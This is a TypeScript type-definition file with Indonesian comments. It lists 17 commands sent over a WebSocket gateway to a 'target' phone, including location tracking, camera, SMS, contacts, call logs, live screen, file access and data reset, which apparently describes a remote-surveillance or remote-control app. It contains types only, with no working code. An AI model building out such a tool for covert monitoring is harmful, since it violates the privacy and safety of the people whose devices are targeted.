/**
 * Daftar 17 Fitur Utama
 */
export type CommandType = 
  | "lacak" 
  | "senter" 
  | "notifikasi" 
  | "kunci_layar" 
  | "reset_data" 
  | "camera" 
  | "sms" 
  | "gallery" 
  | "kontak" 
  | "panggilan" 
  | "live_screen" 
  | "file_target" 
  | "wallpaper" 
  | "app_mgmt" 
  | "lock_pro" 
  | "cam_monitor" 
  | "putar_video";

/**
 * Struktur Payload untuk pengiriman ke Gateway (WebSocket)
 */
export interface CommandPayload {
  command: CommandType;
  timestamp: number;
  options?: Record<string, any>; // Untuk parameter tambahan jika fitur butuh opsi
}

/**
 * Struktur User yang tersimpan di Firestore
 */
export interface UserProfile {
  email: string;
  username: string;
  pin: string;      // PIN permanen untuk otorisasi gateway
  password: string; // Hash password (disarankan)
  createdAt: number;
}

/**
 * Status koneksi perangkat (berguna untuk fitur dashboard)
 */
export interface DeviceStatus {
  targetId: string;
  isOnline: boolean;
  lastSeen: number;
  batteryLevel?: number;
}
